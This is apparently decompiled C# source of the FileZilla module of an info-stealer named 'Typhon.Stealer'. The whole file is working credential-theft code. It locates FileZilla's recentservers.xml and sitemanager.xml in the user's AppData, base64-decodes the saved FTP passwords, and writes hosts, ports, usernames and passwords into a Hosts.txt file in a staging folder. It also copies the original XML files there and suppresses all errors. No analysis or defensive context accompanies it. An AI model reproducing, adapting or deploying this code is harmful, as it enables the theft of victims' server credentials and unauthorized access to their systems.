using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.FTP
{
	// Token: 0x02000020 RID: 32
	internal class FileZilla
	{
		// Token: 0x06000085 RID: 133 RVA: 0x00005A88 File Offset: 0x00003C88
		private static string[] GetXML()
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
			return new string[]
			{
				str + "recentservers.xml",
				str + "sitemanager.xml"
			};
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00005ACC File Offset: 0x00003CCC
		private static List<DataModels.Password> Steal(string sSavePath)
		{
			List<DataModels.Password> list = new List<DataModels.Password>();
			string[] xml = FileZilla.GetXML();
			if (!File.Exists(xml[0]) && !File.Exists(xml[1]))
			{
				return list;
			}
			foreach (string text in xml)
			{
				try
				{
					if (File.Exists(text))
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						foreach (object obj in xmlDocument.GetElementsByTagName("Server"))
						{
							XmlNode xmlNode = (XmlNode)obj;
							string text2;
							if (xmlNode == null)
							{
								text2 = null;
							}
							else
							{
								XmlElement xmlElement = xmlNode["Pass"];
								text2 = ((xmlElement != null) ? xmlElement.InnerText : null);
							}
							string text3 = text2;
							if (text3 != null)
							{
								DataModels.Password password = default(DataModels.Password);
								string[] array2 = new string[5];
								array2[0] = "ftp://";
								int num = 1;
								XmlElement xmlElement2 = xmlNode["Host"];
								array2[num] = ((xmlElement2 != null) ? xmlElement2.InnerText : null);
								array2[2] = ":";
								int num2 = 3;
								XmlElement xmlElement3 = xmlNode["Port"];
								array2[num2] = ((xmlElement3 != null) ? xmlElement3.InnerText : null);
								array2[4] = "/";
								password.sUrl = string.Concat(array2);
								XmlElement xmlElement4 = xmlNode["User"];
								password.sUsername = ((xmlElement4 != null) ? xmlElement4.InnerText : null);
								password.sPassword = Encoding.UTF8.GetString(Convert.FromBase64String(text3));
								DataModels.Password item = password;
								Counter.FtpHosts++;
								list.Add(item);
							}
						}
						File.Copy(text, Path.Combine(sSavePath, new FileInfo(text).Name));
					}
				}
				catch
				{
				}
			}
			return list;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00005CAC File Offset: 0x00003EAC
		private static string FormatPassword(DataModels.Password pPassword)
		{
			return string.Concat(new string[]
			{
				"URL: ",
				pPassword.sUrl,
				"\nUsername: ",
				pPassword.sUsername,
				"\nPassword: ",
				pPassword.sPassword,
				"\n=====================\n\n"
			});
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00005D04 File Offset: 0x00003F04
		public static void WritePasswords(string sSavePath)
		{
			if (!Directory.Exists(sSavePath))
			{
				Directory.CreateDirectory(sSavePath);
			}
			List<DataModels.Password> list = FileZilla.Steal(sSavePath);
			if (list.Count != 0)
			{
				foreach (DataModels.Password pPassword in list)
				{
					File.AppendAllText(sSavePath + "\\Hosts.txt", FileZilla.FormatPassword(pPassword));
				}
				return;
			}
			Directory.Delete(sSavePath);
		}
	}
}
